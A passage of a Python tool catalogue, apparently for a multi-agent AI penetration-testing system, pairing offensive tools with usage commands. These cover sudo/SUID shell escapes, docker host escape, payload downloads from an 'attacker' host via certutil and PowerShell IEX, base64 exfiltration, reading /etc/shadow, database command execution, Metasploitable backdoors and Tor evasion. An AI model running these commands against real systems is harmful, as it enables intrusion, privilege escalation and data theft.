        description="Fast TCP/UDP tunnel over HTTP. Creates port forwards and SOCKS proxies through firewalls using HTTP/HTTPS.",
        phase="POST_EXPLOITATION",
        when_to_use="Pivoting when SSH isn't available. chisel server --reverse on attack box, chisel client on target. Create SOCKS proxy or port forward.",
        related_tools=["ssh", "ligolo-ng", "socat"],
        agents=["red"],
        tags=["tunneling", "pivoting"],
    ),
    "ligolo-ng": ToolReasoning(
        reasoning="Modern tunneling tool using a TUN interface. Creates a virtual network interface on your machine so you can access the target's internal network directly.",
        description="Advanced tunneling/pivoting tool using TUN interfaces. Creates transparent network tunnels for internal network access.",
        phase="POST_EXPLOITATION",
        when_to_use="Pivoting into internal networks. Sets up a TUN interface so you can use any tool as if directly connected to internal network.",
        related_tools=["chisel", "ssh", "proxychains"],
        agents=["red"],
        tags=["tunneling", "pivoting"],
    ),
    "proxychains": ToolReasoning(
        reasoning="Forces any TCP connection through a SOCKS/HTTP proxy. Chain with chisel/SSH SOCKS proxy to route tools through compromised hosts.",
        description="Redirect TCP connections through SOCKS4a/5 or HTTP proxies. Forces external tools through proxy chains.",
        phase="POST_EXPLOITATION",
        when_to_use="After setting up SOCKS proxy (chisel/SSH -D). Run tools against internal network: proxychains nmap -sT internal_host.",
        related_tools=["chisel", "ssh", "socat"],
        agents=["red"],
        tags=["tunneling", "pivoting"],
    ),

    # ─── File Transfer & Exfiltration ───────────────────────────────────
    "wget": ToolReasoning(
        reasoning="Download files from web servers. Upload tools to target by hosting them on your attack box and using wget on target to download.",
        description="Non-interactive network downloader. Downloads files from HTTP/HTTPS/FTP servers.",
        phase="POST_EXPLOITATION",
        when_to_use="Transfer tools to target. Host files on attack box (python -m http.server), download on target with wget.",
        related_tools=["curl", "certutil", "powershell"],
        agents=["red"],
        tags=["file-transfer", "utility"],
    ),
    "python3": ToolReasoning(
        reasoning="Python is everywhere on Linux. HTTP server (python3 -m http.server), reverse shells, scripting, and running exploit code. The universal pentesting glue.",
        description="Python interpreter. HTTP servers, exploit scripts, reverse shells, and automation.",
        phase="EXPLOITATION",
        when_to_use="Host files (python3 -m http.server 80), run exploit scripts, spawn TTY shell (python3 -c 'import pty;pty.spawn(\"/bin/bash\")').",
        related_tools=["python", "pip", "curl"],
        agents=["red"],
        tags=["scripting", "utility"],
    ),

    # ─── SNMP ───────────────────────────────────────────────────────────
    "snmpwalk": ToolReasoning(
        reasoning="SNMP enumeration reveals system info, interfaces, ARP tables, running processes, installed software. Default community strings (public/private) are often unchanged.",
        description="SNMP MIB tree walker. Queries SNMP-enabled devices for system information, network config, and running processes.",
        phase="ENUMERATION",
        when_to_use="When UDP 161 is open. Try default community strings: snmpwalk -v2c -c public target. Can reveal network topology and credentials.",
        related_tools=["snmp-check", "onesixtyone"],
        agents=["scout"],
        tags=["snmp", "enumeration"],
    ),
    "onesixtyone": ToolReasoning(
        reasoning="Fast SNMP community string brute-forcer. Tests multiple community strings quickly to find which ones the device accepts.",
        description="Fast SNMP scanner that brute-forces community strings on SNMP-enabled devices.",
        phase="ENUMERATION",
        when_to_use="Brute-force SNMP community strings when default 'public' doesn't work. Fast UDP scanner.",
        related_tools=["snmpwalk", "snmp-check"],
        agents=["scout"],
        tags=["snmp", "brute-force"],
    ),

    # ─── LDAP ───────────────────────────────────────────────────────────
    "ldapsearch": ToolReasoning(
        reasoning="LDAP query tool for Active Directory. Extracts users, groups, computers, GPOs, and sensitive attributes. Anonymous bind sometimes reveals full directory.",
        description="LDAP search utility. Queries LDAP directories for user, group, computer, and organizational unit information.",
        phase="ENUMERATION",
        when_to_use="When port 389/636 is open. Try anonymous bind first. Extract users, groups, descriptions (often contain passwords).",
        related_tools=["ldapdomaindump", "windapsearch", "bloodhound"],
        agents=["scout", "red"],
        tags=["ad", "ldap", "enumeration"],
    ),

    # ─── MySQL/PostgreSQL/MSSQL ─────────────────────────────────────────
    "mysql": ToolReasoning(
        reasoning="MySQL client. Default installations often have root with no password. After access, dump databases, read files, and potentially get OS command execution via UDF.",
        description="MySQL command-line client. Connect to MySQL databases for enumeration and exploitation.",
        phase="EXPLOITATION",
        when_to_use="When port 3306 is open. Try root with no password: mysql -h target -u root. Then: SELECT * FROM mysql.user; SHOW DATABASES;",
        related_tools=["mysqldump", "sqlmap"],
        agents=["red"],
        tags=["database", "mysql"],
    ),
    "psql": ToolReasoning(
        reasoning="PostgreSQL client. Default creds often postgres:postgres. PostgreSQL can execute OS commands via COPY ... FROM PROGRAM, enabling RCE from database access.",
        description="PostgreSQL interactive terminal. Connect to PostgreSQL databases for enumeration and exploitation.",
        phase="EXPLOITATION",
        when_to_use="When port 5432 is open. Try postgres:postgres. Then: COPY (SELECT '') TO PROGRAM 'id'; for command execution.",
        related_tools=["pgcli", "sqlmap"],
        agents=["red"],
        tags=["database", "postgresql"],
    ),
    "mssqlclient.py": ToolReasoning(
        reasoning="Impacket's MSSQL client. MSSQL with xp_cmdshell enabled gives OS command execution. Often found in AD environments with weak or default SA credentials.",
        description="Impacket MSSQL client. Connect to MSSQL servers, enable xp_cmdshell for command execution.",
        phase="EXPLOITATION",
        when_to_use="When port 1433 is open. Try sa with common passwords. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        related_tools=["crackmapexec", "sqsh", "sqlmap"],
        agents=["red"],
        tags=["database", "mssql", "ad"],
    ),

    # ─── GTFOBins / Living Off The Land ─────────────────────────────────
    "find": ToolReasoning(
        reasoning="Beyond file searching, find can enumerate SUID binaries (find / -perm -4000), writable files, and is itself a GTFOBins escape vector with -exec.",
        description="Search for files in directory hierarchy. Also useful for finding SUID binaries and privesc vectors.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="Find SUID binaries: find / -perm -u=s -type f 2>/dev/null. Find writable files: find / -writable -type f 2>/dev/null.",
        related_tools=["linpeas", "locate"],
        agents=["red"],
        tags=["privesc", "linux", "enumeration"],
    ),
    "sudo": ToolReasoning(
        reasoning="sudo -l reveals what commands current user can run as root. GTFOBins lists 200+ binaries that can be abused when allowed via sudo for privilege escalation.",
        description="Execute commands as another user (usually root). sudo -l lists allowed commands for privilege escalation.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="Always check: sudo -l. If any binary is allowed, check GTFOBins for escape vectors. Common privesc: sudo vim → :!/bin/sh",
        related_tools=["find", "linpeas", "gtfobins"],
        agents=["red"],
        tags=["privesc", "linux"],
    ),
    "python": ToolReasoning(
        reasoning="If python is in sudo -l or has SUID, it's an instant shell: python -c 'import os; os.system(\"/bin/bash\")'. Also used for TTY upgrade.",
        description="Python interpreter. Useful for TTY upgrade, privesc via sudo/SUID, HTTP servers, and exploit scripting.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="TTY upgrade: python -c 'import pty;pty.spawn(\"/bin/bash\")'. Privesc if SUID or in sudo -l.",
        related_tools=["python3", "perl", "ruby"],
        agents=["red"],
        tags=["privesc", "scripting"],
    ),
    "perl": ToolReasoning(
        reasoning="Perl can spawn shells (perl -e 'exec \"/bin/sh\"'). If SUID or in sudo -l, it's a privesc vector. Also used for reverse shells.",
        description="Perl interpreter. Shell escapes, reverse shells, and privesc when available via sudo/SUID.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="Privesc if SUID or sudo: perl -e 'exec \"/bin/sh\"'. Reverse shell: perl -e 'use Socket...'",
        related_tools=["python", "ruby", "bash"],
        agents=["red"],
        tags=["privesc", "scripting"],
    ),
    "vim": ToolReasoning(
        reasoning="Text editor with shell escape. If sudo vim is allowed, :!/bin/sh gives root shell. Also useful for editing configs during post-exploitation.",
        description="Text editor with shell escape capability. Privesc vector when available via sudo.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="If sudo vim is allowed: vim → :set shell=/bin/sh → :shell. Also: vim -c ':!/bin/sh'",
        related_tools=["nano", "less", "man"],
        agents=["red"],
        tags=["privesc", "gtfobins"],
    ),
    "less": ToolReasoning(
        reasoning="File viewer with shell escape. If sudo less is allowed, run !/bin/sh from within less for a root shell.",
        description="File pager with shell escape capability. Privesc when available via sudo.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="If sudo less is allowed: less /etc/passwd → !/bin/sh. Works with most pager programs.",
        related_tools=["more", "vim", "man"],
        agents=["red"],
        tags=["privesc", "gtfobins"],
    ),
    "awk": ToolReasoning(
        reasoning="Text processing with system() function. If sudo awk is allowed, awk 'BEGIN {system(\"/bin/sh\")}' gives root shell.",
        description="Pattern scanning and processing language. Privesc via system() when available through sudo.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="If sudo awk is allowed: awk 'BEGIN {system(\"/bin/sh\")}'. Also useful for text processing.",
        related_tools=["sed", "grep", "perl"],
        agents=["red"],
        tags=["privesc", "gtfobins"],
    ),
    "tar": ToolReasoning(
        reasoning="Archive tool that can execute commands. If sudo tar is allowed: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        description="Archive tool with command execution via checkpoints. Privesc when available through sudo.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="If sudo tar is allowed: use --checkpoint-action=exec=/bin/sh for shell. Also for extracting compressed data.",
        related_tools=["zip", "gzip", "7z"],
        agents=["red"],
        tags=["privesc", "gtfobins"],
    ),

    # ─── Network Utilities ──────────────────────────────────────────────
    "tcpdump": ToolReasoning(
        reasoning="Network packet capture. Capture credentials in cleartext protocols (HTTP, FTP, Telnet), analyze traffic patterns, and discover internal communications.",
        description="Command-line packet analyzer. Captures and displays network traffic for analysis.",
        phase="POST_EXPLOITATION",
        when_to_use="Capture network traffic on compromised host. Look for cleartext credentials, internal service discovery, and lateral movement opportunities.",
        related_tools=["wireshark", "tshark"],
        agents=["red", "shadow"],
        tags=["network", "capture", "stealth"],
    ),
    "arp-scan": ToolReasoning(
        reasoning="ARP-based host discovery. Faster and more reliable than ICMP ping sweeps on local networks. Discovers hosts that block ICMP.",
        description="ARP scanning tool for local network host discovery. Discovers hosts using ARP requests.",
        phase="RECON",
        when_to_use="Discover hosts on local network segment. More reliable than ping sweep: arp-scan --localnet",
        related_tools=["nmap", "netdiscover"],
        agents=["scout"],
        tags=["network", "discovery"],
    ),

    # ─── Container & Cloud ──────────────────────────────────────────────
    "docker": ToolReasoning(
        reasoning="If current user is in docker group, they can mount the host filesystem and escape to root. docker run -v /:/mnt alpine chroot /mnt sh",
        description="Container runtime. Docker group membership is a well-known privesc vector via host filesystem mounting.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="If user is in docker group: docker run -it --rm -v /:/mnt alpine chroot /mnt sh → root on host.",
        not_when="Docker not installed or user not in docker group.",
        related_tools=["kubectl", "lxc"],
        agents=["red"],
        tags=["privesc", "containers"],
    ),
    "kubectl": ToolReasoning(
        reasoning="Kubernetes CLI. Misconfigurations in RBAC allow listing secrets, accessing other pods, and escaping containers to host.",
        description="Kubernetes command-line tool. Manage containers, list secrets, and identify misconfigurations.",
        phase="POST_EXPLOITATION",
        when_to_use="In Kubernetes environments. Check: kubectl auth can-i --list. Look for secret access, pod creation, hostPath mounts.",
        related_tools=["docker", "kube-hunter"],
        agents=["red"],
        tags=["cloud", "containers", "kubernetes"],
    ),

    # ─── Wireless ───────────────────────────────────────────────────────
    "aircrack-ng": ToolReasoning(
        reasoning="WiFi security assessment suite. Captures handshakes and cracks WPA/WPA2 passwords. The standard for wireless penetration testing.",
        description="WiFi network security suite. Monitor mode, packet capture, WEP/WPA/WPA2 cracking.",
        phase="EXPLOITATION",
        when_to_use="WiFi security testing. Put card in monitor mode, capture WPA handshake with airodump-ng, crack with aircrack-ng.",
        related_tools=["airodump-ng", "aireplay-ng", "hashcat"],
        agents=["red"],
        tags=["wireless", "wifi", "cracking"],
    ),

    # ─── Reporting & Data Processing ────────────────────────────────────
    "grep": ToolReasoning(
        reasoning="Text search tool. Essential for finding sensitive data in files: passwords in configs, API keys in source code, emails in databases.",
        description="Pattern matching tool for searching text. Recursive search (-r), regex (-E), and context (-C) for security auditing.",
        phase="POST_EXPLOITATION",
        when_to_use="Search for sensitive data: grep -rn 'password\\|secret\\|api_key' /var/www/. Find config files with credentials.",
        related_tools=["find", "awk", "sed"],
        agents=["red", "scout"],
        tags=["utility", "data-mining"],
    ),
    "cat": ToolReasoning(
        reasoning="File reader. Read config files, /etc/passwd, /etc/shadow (if readable), SSH keys, and other sensitive files during post-exploitation.",
        description="Concatenate and display file contents. Essential for reading configuration files and sensitive data.",
        phase="POST_EXPLOITATION",
        when_to_use="Read sensitive files: /etc/passwd, /etc/shadow, .ssh/authorized_keys, web app configs, database configs.",
        related_tools=["less", "head", "tail"],
        agents=["red"],
        tags=["utility", "file-read"],
    ),

    # ─── Vulnerability Scanning ─────────────────────────────────────────
    "nuclei": ToolReasoning(
        reasoning="Template-based vulnerability scanner. Community-maintained templates for CVEs, misconfigs, and exposures. Fast and configurable.",
        description="Fast vulnerability scanner using community-maintained templates. Covers CVEs, misconfigurations, and exposures.",
        phase="ENUMERATION",
        when_to_use="Automated vulnerability scanning after finding web services. nuclei -u target -t cves/ for CVE checks.",
        related_tools=["nmap", "nikto", "openvas"],
        agents=["scout"],
        tags=["vulnerability", "scanning"],
    ),
    "openvas": ToolReasoning(
        reasoning="Full vulnerability assessment platform. Comprehensive but slow. Good for compliance scanning and thorough vulnerability assessment.",
        description="Open-source vulnerability assessment scanner. Comprehensive network vulnerability scanning with reporting.",
        phase="ENUMERATION",
        when_to_use="Full vulnerability assessment. Set up scan target and full scan profile. Good for finding all known vulnerabilities.",
        not_when="Time-limited engagements. Very slow and noisy.",
        related_tools=["nessus", "nuclei", "nmap"],
        agents=["scout"],
        tags=["vulnerability", "scanning"],
    ),

    # ─── Specific MS2 Tools ─────────────────────────────────────────────
    "vsftpd": ToolReasoning(
        reasoning="vsftpd 2.3.4 has a famous backdoor (CVE-2011-2523). Send a username containing ':)' and a backdoor shell opens on port 6200.",
        description="Very Secure FTP Daemon. Version 2.3.4 contains a backdoor triggered by ':)' in the username field.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 21 running vsftpd 2.3.4. Exploit: use exploit/unix/ftp/vsftpd_234_backdoor → root shell on port 6200.",
        related_tools=["msfconsole", "nc", "ftp"],
        agents=["red"],
        tags=["ms2", "backdoor", "exploitation"],
    ),
    "samba": ToolReasoning(
        reasoning="Samba 3.0.20 has CVE-2007-2447 — command injection via username field. Metasploit module gives immediate root shell.",
        description="SMB file sharing for Unix. Version 3.0.20 vulnerable to CVE-2007-2447 username map script command injection.",
        phase="EXPLOITATION",
        when_to_use="MS2: Ports 139/445 running Samba 3.0.20. Exploit: use exploit/multi/samba/usermap_script → root shell.",
        related_tools=["msfconsole", "smbclient", "enum4linux"],
        agents=["red"],
        tags=["ms2", "smb", "exploitation"],
    ),
    "distcc": ToolReasoning(
        reasoning="distccd (distributed C/C++ compiler) allows unauthenticated remote code execution. Common on older Linux systems.",
        description="Distributed C/C++ compiler daemon. Allows unauthenticated command execution when exposed.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 3632 running distccd. use exploit/unix/misc/distcc_exec → command execution.",
        related_tools=["msfconsole", "nmap"],
        agents=["red"],
        tags=["ms2", "rce"],
    ),
    "unrealircd": ToolReasoning(
        reasoning="UnrealIRCd 3.2.8.1 has a backdoor (CVE-2010-2075) that executes arbitrary commands. Metasploit module gives instant root shell.",
        description="IRC server with known backdoor in version 3.2.8.1. Triggers remote command execution.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 6667 running UnrealIRCd 3.2.8.1. use exploit/unix/irc/unreal_ircd_3281_backdoor → root shell.",
        related_tools=["msfconsole", "nc"],
        agents=["red"],
        tags=["ms2", "backdoor", "irc"],
    ),
    "tomcat": ToolReasoning(
        reasoning="Apache Tomcat with default credentials (tomcat:tomcat) allows deploying WAR files containing web shells. Manager app gives full application server control.",
        description="Java web application server. Default credentials often allow WAR file deployment for code execution.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 8180 running Tomcat. Try default creds (tomcat:tomcat) on /manager/html. Deploy malicious WAR for shell.",
        related_tools=["msfconsole", "curl", "msfvenom"],
        agents=["red"],
        tags=["ms2", "web", "default-creds"],
    ),
    "vnc": ToolReasoning(
        reasoning="VNC with weak password (often 'password') gives graphical desktop access. No authentication or weak authentication is common on internal systems.",
        description="Virtual Network Computing remote desktop. Weak passwords and no-auth configs provide desktop access.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 5900 running VNC. Try password: password. vncviewer target → graphical desktop access.",
        related_tools=["vncviewer", "nmap"],
        agents=["red"],
        tags=["ms2", "remote-access"],
    ),
    "rsh": ToolReasoning(
        reasoning="Remote shell without authentication. Legacy protocol that allows command execution if .rhosts or /etc/hosts.equiv trust the attacking host.",
        description="Remote shell protocol. No encryption, often no authentication. Legacy Unix remote access.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 514 running rshd. May allow unauthenticated command execution. rsh -l root target command.",
        related_tools=["rlogin", "rexec", "ssh"],
        agents=["red"],
        tags=["ms2", "legacy", "no-auth"],
    ),
    "rlogin": ToolReasoning(
        reasoning="Remote login without password. Similar to rsh but gives interactive shell. Trust-based authentication via .rhosts.",
        description="Remote login protocol. No encryption, trust-based authentication. Legacy Unix remote access.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 513 running rlogind. rlogin -l root target for unauthenticated root access.",
        related_tools=["rsh", "rexec", "ssh"],
        agents=["red"],
        tags=["ms2", "legacy", "no-auth"],
    ),
    "ingreslock": ToolReasoning(
        reasoning="Port 1524 backdoor shell. Simply telnet to port 1524 for an instant root shell. No exploit needed — the backdoor is already listening.",
        description="Backdoor shell on port 1524. Direct telnet connection provides root shell access.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 1524 open. telnet target 1524 → immediate root shell. Easiest exploitation path.",
        related_tools=["telnet", "nc"],
        agents=["red"],
        tags=["ms2", "backdoor"],
    ),
    "java_rmi": ToolReasoning(
        reasoning="Java RMI Registry on port 1099 allows remote code execution via deserialization attacks. Metasploit has reliable exploits.",
        description="Java Remote Method Invocation. Deserialization vulnerabilities enable remote code execution.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 1099 running Java RMI. use exploit/multi/misc/java_rmi_server → code execution.",
        related_tools=["msfconsole", "ysoserial"],
        agents=["red"],
        tags=["ms2", "java", "deserialization"],
    ),
    "nfs": ToolReasoning(
        reasoning="NFS with no_root_squash allows mounting remote filesystems and writing as root. Plant SSH keys or SUID binaries for privilege escalation.",
        description="Network File System. World-readable/writable exports allow filesystem access and potential privilege escalation.",
        phase="EXPLOITATION",
        when_to_use="MS2: Port 2049 running NFS. showmount -e target to list exports. Mount and write SSH keys or SUID binaries.",
        related_tools=["showmount", "mount"],
        agents=["red"],
        tags=["ms2", "nfs", "file-access"],
    ),
    "showmount": ToolReasoning(
        reasoning="Lists NFS exports on a target. Shows which directories are shared and to whom. Critical for NFS exploitation.",
        description="Show NFS mount information on a server. Lists exported directories and access permissions.",
        phase="ENUMERATION",
        when_to_use="When port 2049 is open. showmount -e target to see exported directories and mount them.",
        related_tools=["nfs", "mount"],
        agents=["scout", "red"],
        tags=["nfs", "enumeration"],
    ),

    # ─── OSINT & Subdomain Discovery ────────────────────────────────────
    "sublist3r": ToolReasoning(
        reasoning="Subdomain enumeration using search engines and online databases. Passive discovery without touching the target directly.",
        description="Python tool for enumerating subdomains using search engines, VirusTotal, ThreatCrowd, and other OSINT sources.",
        phase="RECON",
        when_to_use="Passive subdomain discovery. sublist3r -d target.com. No direct interaction with target.",
        related_tools=["amass", "subfinder", "fierce"],
        agents=["scout"],
        tags=["osint", "subdomain"],
    ),
    "amass": ToolReasoning(
        reasoning="Most comprehensive subdomain enumeration. Combines passive OSINT, DNS brute-forcing, and active scanning for complete subdomain mapping.",
        description="In-depth attack surface mapping and subdomain enumeration tool using multiple data sources.",
        phase="RECON",
        when_to_use="Comprehensive subdomain discovery. amass enum -d target.com for passive, -active for active scanning.",
        related_tools=["sublist3r", "subfinder", "fierce"],
        agents=["scout"],
        tags=["osint", "subdomain"],
    ),
    "theharvester": ToolReasoning(
        reasoning="OSINT gathering for emails, names, subdomains, IPs, and URLs. Uses search engines and public databases. First step for targeted attacks.",
        description="OSINT tool for gathering emails, subdomains, hosts, employee names from public sources.",
        phase="RECON",
        when_to_use="Passive reconnaissance. Gather emails for phishing, subdomains for scanning, employee names for password spraying.",
        related_tools=["amass", "recon-ng", "maltego"],
        agents=["scout"],
        tags=["osint", "recon"],
    ),

    # ─── Encoding & Payload Delivery ────────────────────────────────────
    "base64": ToolReasoning(
        reasoning="Base64 encoding for payload obfuscation and data exfiltration. Bypass basic input filters by encoding payloads.",
        description="Base64 encode/decode utility. Used for payload encoding and data transfer.",
        phase="EXPLOITATION",
        when_to_use="Encode payloads to bypass filters: echo 'payload' | base64. Exfiltrate data: cat secret | base64.",
        related_tools=["xxd", "openssl"],
        agents=["red", "shadow"],
        tags=["encoding", "evasion"],
    ),
    "certutil": ToolReasoning(
        reasoning="Windows built-in that can download files and decode base64. LOLBin — won't trigger AV alerts like PowerShell might.",
        description="Windows certificate utility. Used as LOLBin for file downloads and base64 decode operations.",
        phase="POST_EXPLOITATION",
        when_to_use="Download files on Windows: certutil -urlcache -split -f http://attacker/file.exe. Decode: certutil -decode encoded.txt decoded.exe.",
        related_tools=["powershell", "bitsadmin", "wget"],
        agents=["red"],
        tags=["windows", "lolbin", "file-transfer"],
    ),
    "powershell": ToolReasoning(
        reasoning="Windows automation and attack framework. Download files, run scripts, dump credentials, enumerate AD. The Windows equivalent of bash for pentesting.",
        description="Windows PowerShell. Powerful scripting for enumeration, exploitation, file transfer, and post-exploitation.",
        phase="POST_EXPLOITATION",
        when_to_use="Windows post-exploitation. Download: IWR -Uri http://attacker/file -OutFile C:\\temp\\file. Run scripts: IEX(New-Object Net.WebClient).DownloadString('url').",
        related_tools=["certutil", "cmd", "wmic"],
        agents=["red"],
        tags=["windows", "scripting", "post-exploitation"],
    ),

    # ─── Stealth & Evasion ──────────────────────────────────────────────
    "nmap_decoy": ToolReasoning(
        reasoning="nmap with decoy IPs (-D) makes scans harder to attribute. Mix your IP with decoys so the target sees multiple apparent source IPs.",
        description="nmap decoy scanning. Sends packets from spoofed IP addresses alongside real scan to confuse defenders.",
        phase="RECON",
        when_to_use="Stealth scanning when you need to blend in. nmap -D RND:10 target sends scans from 10 random decoy IPs.",
        not_when="Scanning through firewalls that block spoofed packets. Only works for SYN scans.",
        related_tools=["nmap", "masscan"],
        agents=["shadow", "scout"],
        tags=["stealth", "evasion"],
    ),
    "tor": ToolReasoning(
        reasoning="Route traffic through Tor network for anonymity. Use with proxychains for anonymous scanning and exploitation.",
        description="The Onion Router — anonymize network traffic through relay nodes.",
        phase="RECON",
        when_to_use="When you need to hide your IP. Start tor, configure proxychains, then: proxychains nmap target.",
        not_when="Speed-critical operations. Tor adds significant latency.",
        related_tools=["proxychains", "torsocks"],
        agents=["shadow"],
        tags=["stealth", "anonymity"],
    ),

    # ─── Credential Spraying & Default Creds ────────────────────────────
    "cewl": ToolReasoning(
        reasoning="Custom wordlist generator from target website. Scrapes words from the target's own website for targeted password attacks.",
        description="Custom wordlist generator that spiders a website and creates a targeted wordlist from found words.",
        phase="ENUMERATION",
        when_to_use="Before password attacks. Create target-specific wordlist: cewl -d 2 -m 5 http://target -w custom_wordlist.txt.",
        related_tools=["hydra", "john", "hashcat"],
        agents=["red", "scout"],
        tags=["passwords", "wordlists"],
    ),
    "crunch": ToolReasoning(
        reasoning="Generate custom wordlists with specific patterns. When you know password policy or format, crunch creates targeted lists.",
        description="Wordlist generator that creates lists based on specified character sets, lengths, and patterns.",
        phase="ENUMERATION",
        when_to_use="Generate pattern-based wordlists. crunch 8 8 -t @@@@%%%% for 8-char with 4 letters + 4 numbers.",
        related_tools=["cewl", "hydra", "hashcat"],
        agents=["red"],
        tags=["passwords", "wordlists"],
    ),

    # ─── Defense & Blue Team ────────────────────────────────────────────
    "iptables": ToolReasoning(
        reasoning="Linux firewall. Block suspicious IPs, restrict outbound connections, and implement network segmentation rules.",
        description="Linux kernel firewall. Configure packet filtering rules for network security.",
        phase="RECON",  # Blue team context
        when_to_use="Blue team: block attacker IPs, restrict outbound to known-good. iptables -A INPUT -s attacker_ip -j DROP.",
        related_tools=["ufw", "firewalld", "nftables"],
        agents=["blue"],
        tags=["defense", "firewall"],
    ),
    "fail2ban": ToolReasoning(
        reasoning="Automated intrusion prevention. Monitors logs for brute-force attempts and temporarily bans offending IPs.",
        description="Intrusion prevention system that monitors logs and bans IPs showing malicious signs.",
        phase="RECON",
        when_to_use="Blue team: protect against brute-force attacks on SSH, FTP, HTTP. Bans IPs after N failed attempts.",
        related_tools=["iptables", "sshguard"],
        agents=["blue"],
        tags=["defense", "ids"],
    ),
    "snort": ToolReasoning(
        reasoning="Network IDS/IPS. Detects and alerts on known attack signatures in network traffic. Essential for blue team monitoring.",
        description="Network intrusion detection and prevention system. Analyzes traffic for known attack patterns.",
        phase="RECON",
        when_to_use="Blue team: monitor network for attacks. Configure rules to detect nmap scans, exploit attempts, and lateral movement.",
        related_tools=["suricata", "zeek", "tcpdump"],
        agents=["blue"],
        tags=["defense", "ids"],
    ),

    # ─── Misc Pentesting Tools ──────────────────────────────────────────
    "exiftool": ToolReasoning(
        reasoning="Metadata extraction from files. Find GPS coordinates, usernames, software versions, and other OSINT data embedded in images, PDFs, and documents.",
        description="Read/write metadata in image, video, and document files. Extracts EXIF, IPTC, XMP data.",
        phase="RECON",
        when_to_use="Extract metadata from downloaded files. Find usernames (Author field), GPS locations, software versions.",
        related_tools=["strings", "binwalk"],
        agents=["scout"],
        tags=["osint", "metadata"],
    ),
    "binwalk": ToolReasoning(
        reasoning="Firmware analysis and file extraction. Finds embedded files, compressed archives, and hidden data within binary files.",
        description="Firmware analysis tool that searches binary images for embedded files and executable code.",
        phase="ENUMERATION",
        when_to_use="CTF challenges, firmware analysis. binwalk -e firmware.bin to extract embedded files.",
        related_tools=["foremost", "strings", "file"],
        agents=["scout"],
        tags=["forensics", "firmware"],
    ),
    "strings": ToolReasoning(
        reasoning="Extract printable strings from binary files. Find hardcoded passwords, API keys, URLs, and other sensitive data in compiled programs.",
        description="Print printable character sequences from binary files. Finds embedded strings.",
        phase="ENUMERATION",
        when_to_use="Quick analysis of binaries: strings binary | grep -i 'password\\|key\\|secret'. Find hardcoded credentials.",
        related_tools=["binwalk", "file", "xxd"],
        agents=["scout", "red"],
        tags=["analysis", "strings"],
    ),
    "strace": ToolReasoning(
        reasoning="Trace system calls. Understand what a program does at the OS level — file access, network connections, spawned processes.",
        description="System call tracer. Monitors interactions between processes and the Linux kernel.",
        phase="POST_EXPLOITATION",
        when_to_use="Debug programs or understand behavior: strace -f ./program. Find files being accessed, credentials being read.",
        related_tools=["ltrace", "gdb"],
        agents=["red"],
        tags=["debugging", "analysis"],
    ),
    "gdb": ToolReasoning(
        reasoning="GNU Debugger for binary exploitation. Step through programs, find buffer overflows, analyze memory layout for exploit development.",
        description="GNU Debugger. Debug programs, analyze binaries, develop exploits for buffer overflows and memory corruption.",
        phase="EXPLOITATION",
        when_to_use="Binary exploitation / buffer overflow challenges. Set breakpoints, examine memory, find offsets for ROP chains.",
        related_tools=["pwndbg", "gef", "radare2"],
        agents=["red"],
        tags=["binary", "exploitation", "debugging"],
    ),
    "objdump": ToolReasoning(
        reasoning="Disassemble binaries. Shows assembly code, sections, symbols. First step in static binary analysis.",
        description="Object file analyzer. Disassembles and displays information about binary files.",
        phase="ENUMERATION",
        when_to_use="Static analysis of binaries. objdump -d binary for disassembly, -x for all headers.",
        related_tools=["gdb", "radare2", "ghidra"],
        agents=["red"],
        tags=["binary", "analysis"],
    ),
    "metasploit": ToolReasoning(
        reasoning="The preeminent exploitation framework. 2000+ exploits for every platform. When you know the CVE or vulnerable service version, Metasploit usually has a module.",
        description="Exploitation framework with thousands of exploits, payloads, and post-exploitation modules for all platforms.",
        phase="EXPLOITATION",
        when_to_use="Known CVEs and vulnerable service versions. search type:exploit <service>, use <module>, set options, exploit.",
        related_tools=["msfconsole", "msfvenom", "searchsploit"],
        agents=["red"],
        tags=["exploitation", "framework"],
    ),
    "netdiscover": ToolReasoning(
        reasoning="Active/passive ARP reconnaissance tool. Discovers live hosts on the local network using ARP requests.",
        description="ARP reconnaissance tool for network discovery. Active and passive modes for finding hosts on local networks.",
        phase="RECON",
        when_to_use="Discover hosts on local network. netdiscover -i eth0 for active scanning.",
        related_tools=["arp-scan", "nmap"],
        agents=["scout"],
        tags=["network", "discovery"],
    ),
    "nbtscan": ToolReasoning(
        reasoning="NetBIOS name scanning. Discovers Windows hosts and their NetBIOS names, users, and MAC addresses on the network.",
        description="NetBIOS name network scanner. Discovers Windows hosts via NetBIOS name service.",
        phase="ENUMERATION",
        when_to_use="Windows network enumeration. nbtscan target_range to discover Windows hosts and their NetBIOS names.",
        related_tools=["enum4linux", "nmap", "crackmapexec"],
        agents=["scout"],
        tags=["windows", "netbios", "enumeration"],
    ),
    "enum4linux-ng": ToolReasoning(
        reasoning="Modern rewrite of enum4linux. Better output formatting, more features, and actively maintained. Preferred over original enum4linux.",
        description="Next-generation Windows/Samba enumeration tool. Improved enum4linux with better output and more features.",
        phase="ENUMERATION",
        when_to_use="When ports 139/445 are open. Preferred over original enum4linux. enum4linux-ng -A target for all checks.",
        related_tools=["enum4linux", "smbmap", "crackmapexec"],
        agents=["scout", "red"],
        tags=["smb", "windows", "enumeration"],
    ),
    "wfuzz": ToolReasoning(
        reasoning="Web fuzzer for brute-forcing parameters, cookies, headers, and POST data. More flexible than gobuster for complex fuzzing scenarios.",
        description="Web application fuzzer. Brute-force parameters, directories, headers, and form data.",
        phase="ENUMERATION",
